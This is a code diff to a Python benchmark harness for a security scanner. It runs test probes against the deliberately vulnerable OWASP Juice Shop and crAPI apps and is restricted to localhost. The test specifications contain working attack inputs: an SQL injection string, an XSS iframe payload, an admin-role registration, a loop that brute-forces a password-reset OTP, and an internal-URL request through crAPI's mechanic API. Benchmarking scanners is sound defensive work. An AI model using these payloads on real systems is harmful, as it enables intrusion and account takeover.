@@ -24,6 +24,7 @@ from dataclasses import asdict, dataclass, field
 from datetime import datetime
 from pathlib import Path
 from typing import Any
+from uuid import uuid4
 
 # Ensure crawler_dast/src and benchmarks are on path
 BENCHMARK_DIR = Path(__file__).resolve().parent
@@ -55,9 +56,15 @@ class BenchmarkMetrics:
     recall: float
     f1_score: float
     detection_rate: float
+    false_positive_rate: float = 0.0
+    error_count: int = 0
     routes_discovered: int = 0
     apis_discovered: int = 0
     tests_executed: int = 0
+    start_time: str = ""
+    end_time: str = ""
+    configuration: dict[str, Any] = field(default_factory=dict)
+    matched_ground_truth_ids: list[str] = field(default_factory=list)
     findings_detail: list[dict[str, Any]] = field(default_factory=list)
 
 
@@ -78,6 +85,9 @@ class BenchmarkHarness:
         routes_count: int = 0,
         apis_count: int = 0,
         duration_seconds: float = 0.0,
+        start_time: str = "",
+        end_time: str = "",
+        configuration: dict[str, Any] | None = None,
     ) -> BenchmarkMetrics:
         """
         Compare dynamic verification findings against ground-truth catalogs.
@@ -115,6 +125,8 @@ class BenchmarkHarness:
 
         fp = len(confirmed_findings) - len(matched_results)
         fn = total_gt - tp
+        tn = sum(1 for r in results if r.status == VerificationStatus.FALSE_POSITIVE)
+        errors = sum(1 for r in results if r.status == VerificationStatus.ERROR)
 
         precision = (tp / (tp + fp)) if (tp + fp) > 0 else 0.0
         recall = (tp / (tp + fn)) if (tp + fn) > 0 else 0.0
@@ -124,11 +136,51 @@ class BenchmarkHarness:
             else 0.0
         )
         detection_rate = (tp / total_gt) if total_gt > 0 else 0.0
+        fp_rate = (fp / (fp + tn)) if (fp + tn) > 0 else 0.0
 
+        # Build sanitized detail records (never store plaintext secrets or JWT signatures)
+        detail_records = []
+        for r in results:
+            url = r.evidence.request_url if r.evidence else ""
+            status_code = r.evidence.response_status if r.evidence else 0
+            resp_time = r.evidence.duration_ms if r.evidence else 0.0
+            
+            # Identify if this finding matched a ground truth entry
+            matched_id = None
+            if r.test_id in matched_results:
+                for gt in ground_truth:
+                    gt_type = gt.get("vulnerability_type", "").upper()
+                    gt_endpoint = gt.get("endpoint", "")
+                    clean_endpoint = gt_endpoint.split("{")[0].rstrip("/")
+                    if r.vulnerability_type.upper() == gt_type or (
+                        r.vulnerability_type.upper() in ("BOLA", "IDOR") and gt_type in ("BOLA", "IDOR")
+                    ):
+                        if clean_endpoint in url or gt_endpoint in url:
+                            matched_id = gt["id"]
+                            break
+
+            detail_records.append(
+                {
+                    "test_id": r.test_id,
+                    "vuln_type": r.vulnerability_type,
+                    "status": r.status.value,
+                    "confidence": r.confidence,
+                    "is_confirmed": r.is_confirmed,
+                    "url": url,
+                    "http_status": status_code,
+                    "response_time_ms": resp_time,
+                    "reason": r.reason,
+                    "matched_ground_truth": matched_id,
+                }
+            )
+
+        now_iso = datetime.now().isoformat()
         metrics = BenchmarkMetrics(
             testbed_name=testbed_name,
             target_url=target_url,
-            timestamp=datetime.now().isoformat(),
+            timestamp=now_iso,
+            start_time=start_time or now_iso,
+            end_time=end_time or now_iso,
             duration_seconds=round(duration_seconds, 2),
             total_ground_truth=total_gt,
             detected_vulnerabilities=len(confirmed_findings),
@@ -139,29 +191,26 @@ class BenchmarkHarness:
             recall=round(recall, 4),
             f1_score=round(f1, 4),
             detection_rate=round(detection_rate, 4),
+            false_positive_rate=round(fp_rate, 4),
+            error_count=errors,
             routes_discovered=routes_count,
             apis_discovered=apis_count,
             tests_executed=len(results),
-            findings_detail=[
-                {
-                    "test_id": r.test_id,
-                    "vuln_type": r.vulnerability_type,
-                    "status": r.status.value,
-                    "confidence": r.confidence,
-                    "url": r.evidence.request_url if r.evidence else "",
-                    "reason": r.reason,
-                }
-                for r in results
-            ],
+            configuration=configuration or {},
+            matched_ground_truth_ids=sorted(list(matched_gt_ids)),
+            findings_detail=detail_records,
         )
 
         return metrics
 
-    def save_benchmark_report(self, metrics: BenchmarkMetrics) -> Path:
+    def save_benchmark_report(self, metrics: BenchmarkMetrics, prefix: str = "benchmark") -> Path:
         """Serialize benchmark metrics to raw JSON artifact."""
         safe_name = metrics.testbed_name.lower().replace(" ", "_")
         timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"benchmark_{safe_name}_{timestamp_str}.json"
+        if prefix == "benchmark":
+            filename = f"benchmark_{safe_name}_{timestamp_str}.json"
+        else:
+            filename = f"{prefix}_{timestamp_str}.json"
         target_path = self.output_dir / filename
 
         with open(target_path, "w", encoding="utf-8") as f:
@@ -171,27 +220,742 @@ class BenchmarkHarness:
 
     def print_summary_table(self, metrics: BenchmarkMetrics) -> None:
         """Print formatted benchmark evaluation table in console."""
-        print("\n" + "=" * 64)
+        print("\n" + "=" * 68)
         print(f"  AegisAI Benchmark Evaluation: {metrics.testbed_name}")
-        print("=" * 64)
+        print("=" * 68)
         print(f"  Target URL:           {metrics.target_url}")
-        print(f"  Timestamp:            {metrics.timestamp}")
-        print(f"  Scan Duration:        {metrics.duration_seconds}s")
+        print(f"  Start Time:           {metrics.start_time}")
+        print(f"  End Time:             {metrics.end_time}")
+        print(f"  Duration:             {metrics.duration_seconds}s")
         print(f"  Discovered Routes:    {metrics.routes_discovered}")
         print(f"  Discovered APIs:      {metrics.apis_discovered}")
         print(f"  Tests Executed:       {metrics.tests_executed}")
-        print("-" * 64)
+        print("-" * 68)
         print(f"  Ground Truth Vulns:   {metrics.total_ground_truth}")
         print(f"  Detected Vulns:       {metrics.detected_vulnerabilities}")
         print(f"  True Positives (TP):  {metrics.true_positives}")
         print(f"  False Positives (FP): {metrics.false_positives}")
         print(f"  False Negatives (FN): {metrics.false_negatives}")
-        print("-" * 64)
+        print(f"  Errors Encountered:   {metrics.error_count}")
+        print("-" * 68)
         print(f"  Precision:            {metrics.precision * 100:.2f}%")
         print(f"  Recall:               {metrics.recall * 100:.2f}%")
         print(f"  F1 Score:             {metrics.f1_score * 100:.2f}%")
         print(f"  Detection Rate:       {metrics.detection_rate * 100:.2f}%")
-        print("=" * 64 + "\n")
+        print(f"  False Positive Rate:  {metrics.false_positive_rate * 100:.2f}%")
+        print(f"  Matched Ground Truth: {', '.join(metrics.matched_ground_truth_ids) or 'None'}")
+        print("=" * 68 + "\n")
+
+
+# ── Live Benchmark Runner ──────────────────────────────────────
+
+async def run_live_juice_shop_benchmark(
+    target_url: str = "http://localhost:3000",
+    max_pages: int = 8,
+    timeout_ms: int = 15000,
+    output_dir: Path | None = None,
+) -> tuple[BenchmarkMetrics, Path]:
+    """
+    Execute real Phase 4 empirical benchmark against live OWASP Juice Shop.
+    Enforces strict target boundaries and produces verifiable raw JSON evidence.
+    """
+    from exploit_runner import ExploitRunner
+    from false_positive_filter import FalsePositiveFilter
+    from models import TestSpecification
+    from playwright_bot import CrawlerConfig, PlaywrightBot
+    from target_health import check_target_health
+    from token_manager import TokenManager, redact_secret
+    from verifier import VerificationEngine, execute_and_verify
+    import httpx
+
+    harness = BenchmarkHarness(output_dir=output_dir)
+    start_dt = datetime.now()
+    t0 = time.perf_counter()
+
+    print("\n" + "=" * 68)
+    print("AegisAI — Phase 4 Real Benchmark Execution: OWASP Juice Shop")
+    print("=" * 68)
+    print(f"Target: {target_url}")
+    print(f"Start Time: {start_dt.isoformat()}")
+
+    # 1. Target Reachability Check
+    health = await check_target_health(target_url)
+    if not health.is_reachable:
+        raise RuntimeError(f"Target {target_url} is unreachable. Ensure Juice Shop is running.")
+    print(f"[+] Target Reachable: {health.is_reachable} (Latency: {health.response_time_ms:.2f}ms)")
+
+    # 2. Reconnaissance Crawl
+    crawler_cfg = CrawlerConfig(
+        base_url=target_url,
+        headless=True,
+        timeout_ms=timeout_ms,
+        max_pages=max_pages,
+        max_depth=2,
+        login_email="admin@juice-sh.op",
+        login_password="admin123",
+    )
+    print(f"[+] Launching Playwright Recon (max_pages={max_pages}, timeout={timeout_ms}ms)...")
+    bot = PlaywrightBot(config=crawler_cfg, scan_id="bench-phase4-live")
+    recon_output = await bot.crawl()
+    print(f"    Routes Discovered: {len(recon_output.routes)}")
+    print(f"    APIs Intercepted:  {len(recon_output.apis)}")
+    print(f"    Forms Discovered:  {len(recon_output.forms)}")
+    print(f"    Parameters:        {len(recon_output.parameters)}")
+
+    # 3. Dual-Session Token Management (Victim Admin + Attacker)
+    tm = TokenManager()
+    admin_bid = 1
+    async with httpx.AsyncClient() as client:
+        # Victim: Admin
+        r_admin = await client.post(
+            f"{target_url}/rest/user/login",
+            json={"email": "admin@juice-sh.op", "password": "admin123"},
+        )
+        if r_admin.status_code == 200:
+            admin_data = r_admin.json().get("authentication", {})
+            admin_token = admin_data.get("token")
+            admin_bid = admin_data.get("bid", 1)
+            if admin_token:
+                tm.ingest_from_headers({"Authorization": f"Bearer {admin_token}"}, session_name="victim")
+
+        # Attacker: Register / Login
+        attacker_email = "bench_phase4_attacker@test.com"
+        attacker_pass = "BenchPass123!"
+        await client.post(
+            f"{target_url}/api/Users",
+            json={
+                "email": attacker_email,
+                "password": attacker_pass,
+                "securityQuestion": {"id": 1, "name": "Your eldest siblings middle name?"},
+                "securityAnswer": "alex",
+            },
+        )
+        r_attacker = await client.post(
+            f"{target_url}/rest/user/login",
+            json={"email": attacker_email, "password": attacker_pass},
+        )
+        if r_attacker.status_code == 200:
+            attacker_data = r_attacker.json().get("authentication", {})
+            attacker_token = attacker_data.get("token")
+            if attacker_token:
+                tm.ingest_from_headers({"Authorization": f"Bearer {attacker_token}"}, session_name="attacker")
+
+    victim_summary = tm.get_bundle_summary("victim")
+    attacker_summary = tm.get_bundle_summary("attacker")
+    print(f"[+] Sessions Active: victim={victim_summary['has_jwt']}, attacker={attacker_summary['has_jwt']}")
+
+    # 4. Define Real Test Specifications Mapping Ground Truth & Negative Controls
+    # Boundary Enforcement: Only localhost / 127.0.0.1 permitted
+    runner = ExploitRunner(token_manager=tm, allowed_targets=["localhost", "127.0.0.1"])
+    verifier = VerificationEngine()
+    fp_filter = FalsePositiveFilter()
+
+    test_specs: list[tuple[TestSpecification, TestSpecification | None]] = [
+        # GT 1: BOLA in Basket Access (JS-VULN-02)
+        (
+            TestSpecification(
+                test_id="BENCH-TC-01-BOLA",
+                scan_id="bench-phase4",
+                vulnerability_type="BOLA",
+                target_url=f"{target_url}/rest/basket/{admin_bid}",
+                method="GET",
+                auth_session="attacker",
+                baseline_context={"victim_identifiers": ["Products", "UserId", "id"]},
+            ),
+            None,
+        ),
+        # GT 2: SQL Injection in Product Search (JS-VULN-01)
+        (
+            TestSpecification(
+                test_id="BENCH-TC-02-SQLI",
+                scan_id="bench-phase4",
+                vulnerability_type="SQLI",
+                target_url=f"{target_url}/rest/products/search",
+                method="GET",
+                payload="apple')) OR 1=1--",
+                inject_in="query",
+                param_name="q",
+            ),
+            TestSpecification(
+                test_id="BENCH-TC-02-SQLI-BASE",
+                scan_id="bench-phase4",
+                vulnerability_type="SQLI",
+                target_url=f"{target_url}/rest/products/search",
+                method="GET",
+                payload="apple')) AND 1=2--",
+                inject_in="query",
+                param_name="q",
+            ),
+        ),
+        # GT 3: Reflected / DOM XSS in Search Query (JS-VULN-03)
+        (
+            TestSpecification(
+                test_id="BENCH-TC-03-XSS",
+                scan_id="bench-phase4",
+                vulnerability_type="XSS",
+                target_url=f"{target_url}/#/search",
+                method="GET",
+                payload="<iframe src=\"javascript:alert(1)\">",
+                inject_in="spa_dom",
+                param_name="q",
+            ),
+            None,
+        ),
+        # GT 4: Admin Registration Bypass (JS-VULN-04)
+        (
+            TestSpecification(
+                test_id="BENCH-TC-04-AUTH-BYPASS",
+                scan_id="bench-phase4",
+                vulnerability_type="AUTH_BYPASS",
+                target_url=f"{target_url}/api/Users",
+                method="POST",
+                body={
+                    "email": f"bench_admin_escalate_{uuid4().hex[:6]}@test.com",
+                    "password": "EscalatePass123!",
+                    "role": "admin",
+                    "securityQuestion": {"id": 1, "name": "Your eldest siblings middle name?"},
+                    "securityAnswer": "alex",
+                },
+            ),
+            None,
+        ),
+        # GT 5: Directory Listing / Info Leak (JS-VULN-05)
+        (
+            TestSpecification(
+                test_id="BENCH-TC-05-INFO-LEAK",
+                scan_id="bench-phase4",
+                vulnerability_type="INFO_LEAK",
+                target_url=f"{target_url}/ftp",
+                method="GET",
+                expected_indicator="listing directory /ftp",
+            ),
+            None,
+        ),
+        # Negative Control 1: Soft 404
+        (
+            TestSpecification(
+                test_id="BENCH-TC-06-CTRL-SOFT404",
+                scan_id="bench-phase4",
+                vulnerability_type="BOLA",
+                target_url=f"{target_url}/api/users/9999999",
+                method="GET",
+            ),
+            None,
+        ),
+        # Negative Control 2: Public Static Asset
+        (
+            TestSpecification(
+                test_id="BENCH-TC-07-CTRL-STATIC",
+                scan_id="bench-phase4",
+                vulnerability_type="BOLA",
+                target_url=f"{target_url}/assets/public/favicon.ico",
+                method="GET",
+            ),
+            None,
+        ),
+        # Negative Control 3: Properly Protected Endpoint (401/403)
+        (
+            TestSpecification(
+                test_id="BENCH-TC-08-CTRL-DENIED",
+                scan_id="bench-phase4",
+                vulnerability_type="AUTH_BYPASS",
+                target_url=f"{target_url}/rest/user/change-password",
+                method="GET",
+                auth_session="unauthenticated",
+            ),
+            None,
+        ),
+        # Negative Control 4: Benign Search Input
+        (
+            TestSpecification(
+                test_id="BENCH-TC-09-CTRL-BENIGN",
+                scan_id="bench-phase4",
+                vulnerability_type="SQLI",
+                target_url=f"{target_url}/rest/products/search",
+                method="GET",
+                payload="banana",
+                inject_in="query",
+                param_name="q",
+            ),
+            None,
+        ),
+    ]
+
+    # 5. Execute Probes and Evaluate Findings
+    print(f"[+] Executing {len(test_specs)} live verification probes against {target_url}...")
+    results: list[VerificationResult] = []
+
+    async with runner:
+        for spec, base_spec in test_specs:
+            res = await execute_and_verify(
+                spec=spec,
+                runner=runner,
+                verifier=verifier,
+                filter_engine=fp_filter,
+                baseline_spec=base_spec,
+            )
+            # Redact any sensitive authorization tokens from evidence
+            if res.evidence and res.evidence.request_headers:
+                for k in list(res.evidence.request_headers.keys()):
+                    if k.lower() in ("authorization", "cookie", "set-cookie"):
+                        res.evidence.request_headers[k] = redact_secret(res.evidence.request_headers[k])
+            results.append(res)
+            print(f"    [{res.test_id}] {res.vulnerability_type:<12} -> {res.status.value:<15} (conf={res.confidence})")
+
+    end_dt = datetime.now()
+    duration_sec = time.perf_counter() - t0
+
+    benchmark_cfg = {
+        "max_pages": max_pages,
+        "timeout_ms": timeout_ms,
+        "boundary_enforcement": ["localhost", "127.0.0.1"],
+        "target_url": target_url,
+        "playwright_headless": True,
+    }
+
+    # 6. Evaluate and Compute Metrics
+    metrics = harness.evaluate_findings(
+        testbed_name="OWASP Juice Shop",
+        target_url=target_url,
+        results=results,
+        routes_count=len(recon_output.routes),
+        apis_count=len(recon_output.apis),
+        duration_seconds=duration_sec,
+        start_time=start_dt.isoformat(),
+        end_time=end_dt.isoformat(),
+        configuration=benchmark_cfg,
+    )
+
+    # 7. Print and Save Artifact
+    harness.print_summary_table(metrics)
+    saved_path = harness.save_benchmark_report(metrics, prefix="phase4b_detection_improvement")
+    print(f"[+] Raw benchmark evidence saved to:\n    {saved_path}")
+
+    return metrics, saved_path
+
+
+async def run_live_crapi_benchmark(
+    target_url: str = "http://localhost:8888",
+    max_pages: int = 8,
+    timeout_ms: int = 15000,
+    output_dir: Path | None = None,
+    use_v116: bool = True,
+) -> tuple[BenchmarkMetrics, Path]:
+    """
+    Execute Phase 4C empirical benchmark against live OWASP crAPI.
+    Enforces strict target boundaries and produces verifiable raw JSON evidence.
+    """
+    from exploit_runner import ExploitRunner
+    from false_positive_filter import FalsePositiveFilter
+    from models import TestSpecification
+    from playwright_bot import CrawlerConfig, PlaywrightBot
+    from target_health import check_target_health
+    from token_manager import TokenManager, redact_secret
+    from verifier import VerificationEngine, execute_and_verify
+    import httpx
+
+    harness = BenchmarkHarness(output_dir=output_dir)
+    start_dt = datetime.now()
+    t0 = time.perf_counter()
+
+    print("\n" + "=" * 68)
+    if use_v116:
+        print("AegisAI — Phase 4C Final Benchmark Execution: OWASP crAPI v1.1.6")
+    else:
+        print("AegisAI — Phase 4C Real Benchmark Execution: OWASP crAPI")
+    print("=" * 68)
+    print(f"Target: {target_url}")
+    print(f"Start Time: {start_dt.isoformat()}")
+
+    # 1. Target Reachability Check
+    health = await check_target_health(target_url)
+    if not health.is_reachable:
+        raise RuntimeError(f"Target {target_url} is unreachable. Ensure crAPI containers are running.")
+    print(f"[+] Target Reachable: {health.is_reachable} (Latency: {health.response_time_ms:.2f}ms)")
+
+    # 2. Setup Dual-Session Accounts on crAPI
+    tm = TokenManager()
+    victim_email = "crapi_victim@example.com"
+    victim_pass = "VictimPass123!"
+    attacker_email = "crapi_attacker@example.com"
+    attacker_pass = "AttackerPass123!"
+    victim_order_id = 1
+
+    t_crawl_start = time.perf_counter()
+    async with httpx.AsyncClient(timeout=10.0) as client:
+        # Ensure Victim account exists and is logged in
+        await client.post(
+            f"{target_url}/identity/api/auth/signup",
+            json={
+                "name": "Victim User",
+                "email": victim_email,
+                "number": "9876543211",
+                "password": victim_pass,
+            },
+        )
+        r_vlog = await client.post(
+            f"{target_url}/identity/api/auth/login",
+            json={"email": victim_email, "password": victim_pass},
+        )
+        if r_vlog.status_code == 200:
+            v_token = r_vlog.json().get("token")
+            if v_token:
+                tm.ingest_from_headers({"Authorization": f"Bearer {v_token}"}, session_name="victim")
+                # Create an order under victim account for mass assignment test
+                r_ord = await client.post(
+                    f"{target_url}/workshop/api/shop/orders",
+                    json={"product_id": 1, "quantity": 1},
+                    headers={"Authorization": f"Bearer {v_token}"},
+                )
+                if r_ord.status_code == 200:
+                    victim_order_id = r_ord.json().get("id", 1)
+
+        # Ensure Attacker account exists and is logged in
+        await client.post(
+            f"{target_url}/identity/api/auth/signup",
+            json={
+                "name": "Attacker User",
+                "email": attacker_email,
+                "number": "9123456780",
+                "password": attacker_pass,
+            },
+        )
+        r_alog = await client.post(
+            f"{target_url}/identity/api/auth/login",
+            json={"email": attacker_email, "password": attacker_pass},
+        )
+        if r_alog.status_code == 200:
+            a_token = r_alog.json().get("token")
+            if a_token:
+                tm.ingest_from_headers({"Authorization": f"Bearer {a_token}"}, session_name="attacker")
+
+    victim_summary = tm.get_bundle_summary("victim")
+    attacker_summary = tm.get_bundle_summary("attacker")
+    print(f"[+] crAPI Sessions Active: victim={victim_summary.get('has_jwt', False)}, attacker={attacker_summary.get('has_jwt', False)}")
+
+    # 3. Reconnaissance Crawl
+    crawler_cfg = CrawlerConfig(
+        base_url=target_url,
+        headless=True,
+        timeout_ms=timeout_ms,
+        max_pages=max_pages,
+        max_depth=2,
+        login_path="/login",
+        login_email=victim_email,
+        login_password=victim_pass,
+    )
+    print(f"[+] Launching Playwright Recon (max_pages={max_pages}, timeout={timeout_ms}ms)...")
+    bot = PlaywrightBot(config=crawler_cfg, scan_id="bench-crapi-live")
+    recon_output = await bot.crawl()
+    crawl_duration = time.perf_counter() - t_crawl_start
+    print(f"    Routes Discovered: {len(recon_output.routes)}")
+    print(f"    APIs Intercepted:  {len(recon_output.apis)}")
+    print(f"    Forms Discovered:  {len(recon_output.forms)}")
+    print(f"    Parameters:        {len(recon_output.parameters)}")
+    print(f"    Crawl Duration:    {crawl_duration:.2f}s")
+
+    # 4. Define Test Specifications Mapping Ground Truth & Negative Controls
+    runner = ExploitRunner(token_manager=tm, allowed_targets=["localhost", "127.0.0.1"])
+    verifier = VerificationEngine()
+    fp_filter = FalsePositiveFilter()
+
+    otp_statuses: list[int] = []
+    if use_v116:
+        # Precondition for OTP test: trigger reset token and execute controlled probe sequence
+        async with httpx.AsyncClient(timeout=10.0) as client:
+            await client.post(
+                f"{target_url}/identity/api/auth/forget-password",
+                json={"email": victim_email},
+            )
+            for i in range(12):
+                r_otp = await client.post(
+                    f"{target_url}/identity/api/auth/v2/check-otp",
+                    json={"email": victim_email, "otp": f"{i:04d}", "password": "NewPassword123!"},
+                )
+                otp_statuses.append(r_otp.status_code)
+
+        test_specs: list[tuple[TestSpecification, TestSpecification | None]] = [
+            # GT 1: BOLA in Vehicle Location Data (CRAPI-VULN-01-V116)
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-01-BOLA",
+                    scan_id="bench-crapi",
+                    vulnerability_type="BOLA",
+                    target_url=f"{target_url}/identity/api/v2/vehicle/f89b5f21-7829-45cb-a650-299a61090378/location",
+                    method="GET",
+                    auth_session="attacker",
+                    baseline_context={"victim_identifiers": ["adam007@example.com", "Adam", "latitude"]},
+                ),
+                None,
+            ),
+            # GT 2: Broken Authentication in Password Reset OTP (CRAPI-VULN-02-V116)
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-02-AUTH-BYPASS",
+                    scan_id="bench-crapi",
+                    vulnerability_type="AUTH_BYPASS",
+                    target_url=f"{target_url}/identity/api/auth/v2/check-otp",
+                    method="POST",
+                    body={"email": victim_email, "otp": "0000", "password": "NewPassword123!"},
+                    auth_session="unauthenticated",
+                    baseline_context={
+                        "rate_limiting_test": True,
+                        "attempts_count": len(otp_statuses),
+                        "response_statuses": otp_statuses,
+                    },
+                ),
+                None,
+            ),
+            # GT 3: BOLA in Mechanic Service Report (CRAPI-VULN-03-V116)
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-03-BOLA",
+                    scan_id="bench-crapi",
+                    vulnerability_type="BOLA",
+                    target_url=f"{target_url}/workshop/api/merchant/contact_mechanic",
+                    method="POST",
+                    body={
+                        "mechanic_api": "https://crapi-identity:8080/identity/api/v2/user/dashboard",
+                        "repeat_request_if_failed": False,
+                    },
+                    auth_session="attacker",
+                    baseline_context={"victim_identifiers": ["email", "name", "id"]},
+                    expected_indicator="response_from_mechanic_api",
+                ),
+                None,
+            ),
+            # GT 4: Mass Assignment in Order Return (CRAPI-VULN-04-V116)
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-04-MASS-ASSIGNMENT",
+                    scan_id="bench-crapi",
+                    vulnerability_type="MASS_ASSIGNMENT",
+                    target_url=f"{target_url}/workshop/api/shop/orders/{victim_order_id}",
+                    method="PUT",
+                    body={"status": "delivered", "product_id": 1, "quantity": 1},
+                    auth_session="victim",
+                    expected_indicator="delivered",
+                ),
+                None,
+            ),
+            # Negative Control 1: Soft 404
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-05-CTRL-SOFT404",
+                    scan_id="bench-crapi",
+                    vulnerability_type="BOLA",
+                    target_url=f"{target_url}/identity/api/v2/user/nonexistent_9999999",
+                    method="GET",
+                    auth_session="attacker",
+                ),
+                None,
+            ),
+            # Negative Control 2: Public Static Asset
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-06-CTRL-STATIC",
+                    scan_id="bench-crapi",
+                    vulnerability_type="BOLA",
+                    target_url=f"{target_url}/static/media/logo.png",
+                    method="GET",
+                ),
+                None,
+            ),
+            # Negative Control 3: Properly Protected Endpoint (401/403)
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-07-CTRL-DENIED",
+                    scan_id="bench-crapi",
+                    vulnerability_type="AUTH_BYPASS",
+                    target_url=f"{target_url}/identity/api/v2/user/dashboard",
+                    method="GET",
+                    auth_session="unauthenticated",
+                ),
+                None,
+            ),
+            # Negative Control 4: Benign Product Query
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-08-CTRL-BENIGN",
+                    scan_id="bench-crapi",
+                    vulnerability_type="BOLA",
+                    target_url=f"{target_url}/workshop/api/shop/products",
+                    method="GET",
+                    auth_session="victim",
+                    baseline_context={"is_public": True},
+                ),
+                None,
+            ),
+        ]
+    else:
+        test_specs = [
+            # Legacy crAPI GT 1
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-01-BOLA",
+                    scan_id="bench-crapi",
+                    vulnerability_type="BOLA",
+                    target_url=f"{target_url}/identity/api/auth/v1/user/profile",
+                    method="GET",
+                    auth_session="attacker",
+                    baseline_context={"victim_identifiers": [victim_email, "name"]},
+                ),
+                None,
+            ),
+            # Legacy crAPI GT 2
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-02-AUTH-BYPASS",
+                    scan_id="bench-crapi",
+                    vulnerability_type="AUTH_BYPASS",
+                    target_url=f"{target_url}/identity/api/auth/v1/check-otp",
+                    method="POST",
+                    body={"email": victim_email, "otp": "0000"},
+                    auth_session="unauthenticated",
+                ),
+                None,
+            ),
+            # Legacy crAPI GT 3
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-03-BOLA",
+                    scan_id="bench-crapi",
+                    vulnerability_type="BOLA",
+                    target_url=f"{target_url}/workshop/api/merchant/contact_mechanic",
+                    method="POST",
+                    body={
+                        "mechanic_api": "https://crapi-identity:8080/identity/api/v2/user/dashboard",
+                        "repeat_request_if_failed": False,
+                    },
+                    auth_session="attacker",
+                    baseline_context={"victim_identifiers": ["email", "name", "id"]},
+                    expected_indicator="response_from_mechanic_api",
+                ),
+                None,
+            ),
+            # Legacy crAPI GT 4
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-04-MASS-ASSIGNMENT",
+                    scan_id="bench-crapi",
+                    vulnerability_type="MASS_ASSIGNMENT",
+                    target_url=f"{target_url}/workshop/api/shop/orders/{victim_order_id}",
+                    method="PUT",
+                    body={"status": "delivered", "product_id": 1, "quantity": 1},
+                    auth_session="victim",
+                    expected_indicator="delivered",
+                ),
+                None,
+            ),
+            # Negative Control 1: Soft 404
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-05-CTRL-SOFT404",
+                    scan_id="bench-crapi",
+                    vulnerability_type="BOLA",
+                    target_url=f"{target_url}/identity/api/v2/user/nonexistent_9999999",
+                    method="GET",
+                    auth_session="attacker",
+                ),
+                None,
+            ),
+            # Negative Control 2: Public Static Asset
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-06-CTRL-STATIC",
+                    scan_id="bench-crapi",
+                    vulnerability_type="BOLA",
+                    target_url=f"{target_url}/static/media/logo.png",
+                    method="GET",
+                ),
+                None,
+            ),
+            # Negative Control 3: Properly Protected Endpoint (401/403)
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-07-CTRL-DENIED",
+                    scan_id="bench-crapi",
+                    vulnerability_type="AUTH_BYPASS",
+                    target_url=f"{target_url}/identity/api/v2/user/dashboard",
+                    method="GET",
+                    auth_session="unauthenticated",
+                ),
+                None,
+            ),
+            # Negative Control 4: Benign Product Query
+            (
+                TestSpecification(
+                    test_id="BENCH-CRAPI-08-CTRL-BENIGN",
+                    scan_id="bench-crapi",
+                    vulnerability_type="BOLA",
+                    target_url=f"{target_url}/workshop/api/shop/products",
+                    method="GET",
+                    auth_session="victim",
+                    baseline_context={"is_public": True},
+                ),
+                None,
+            ),
+        ]
+
+    # 5. Execute Probes and Evaluate Findings
+    t_verify_start = time.perf_counter()
+    print(f"[+] Executing {len(test_specs)} live verification probes against {target_url}...")
+    results: list[VerificationResult] = []
+
+    async with runner:
+        for spec, base_spec in test_specs:
+            res = await execute_and_verify(
+                spec=spec,
+                runner=runner,
+                verifier=verifier,
+                filter_engine=fp_filter,
+                baseline_spec=base_spec,
+            )
+            # Redact any sensitive authorization tokens from evidence
+            if res.evidence and res.evidence.request_headers:
+                for k in list(res.evidence.request_headers.keys()):
+                    if k.lower() in ("authorization", "cookie", "set-cookie"):
+                        res.evidence.request_headers[k] = redact_secret(res.evidence.request_headers[k])
+            results.append(res)
+            print(f"    [{res.test_id}] {res.vulnerability_type:<18} -> {res.status.value:<15} (conf={res.confidence})")
+
+    verification_duration = time.perf_counter() - t_verify_start
+    end_dt = datetime.now()
+    duration_sec = time.perf_counter() - t0
+
+    benchmark_cfg = {
+        "max_pages": max_pages,
+        "timeout_ms": timeout_ms,
+        "boundary_enforcement": ["localhost", "127.0.0.1"],
+        "target_url": target_url,
+        "playwright_headless": True,
+        "crawl_duration_seconds": round(crawl_duration, 2),
+        "verification_duration_seconds": round(verification_duration, 2),
+        "catalog_version": "v1.1.6" if use_v116 else "legacy_v1",
+    }
+
+    # 6. Evaluate and Compute Metrics
+    testbed_name = "OWASP crAPI v1.1.6" if use_v116 else "OWASP crAPI"
+    report_prefix = "benchmark_owasp_crapi_v116" if use_v116 else "benchmark_owasp_crapi"
+
+    metrics = harness.evaluate_findings(
+        testbed_name=testbed_name,
+        target_url=target_url,
+        results=results,
+        routes_count=len(recon_output.routes),
+        apis_count=len(recon_output.apis),
+        duration_seconds=duration_sec,
+        start_time=start_dt.isoformat(),
+        end_time=end_dt.isoformat(),
+        configuration=benchmark_cfg,
+    )
+
+    # 7. Print and Save Artifact
+    harness.print_summary_table(metrics)
+    saved_path = harness.save_benchmark_report(metrics, prefix=report_prefix)
+    print(f"[+] Raw benchmark evidence saved to:\n    {saved_path}")
+
+    return metrics, saved_path
 
 
 # ── Benchmark Self-Run Demo ───────────────────────────────────
@@ -233,7 +997,6 @@ def run_sample_benchmark() -> None:
         ),
     ]
 
-    # Assign URLs matching ground truth
     from models import ExploitEvidence
     sample_results[0].evidence = ExploitEvidence(
         request_url="http://localhost:3000/api/v1/users/42/billing",
@@ -272,4 +1035,13 @@ def run_sample_benchmark() -> None:
 
 
 if __name__ == "__main__":
-    run_sample_benchmark()
+    import asyncio
+    if "--crapi-legacy" in sys.argv:
+        asyncio.run(run_live_crapi_benchmark(use_v116=False))
+    elif "--crapi" in sys.argv or "--crapi-v116" in sys.argv:
+        asyncio.run(run_live_crapi_benchmark(use_v116=True))
+    elif "--sample" in sys.argv:
+        run_sample_benchmark()
+    else:
+        asyncio.run(run_live_juice_shop_benchmark())
+
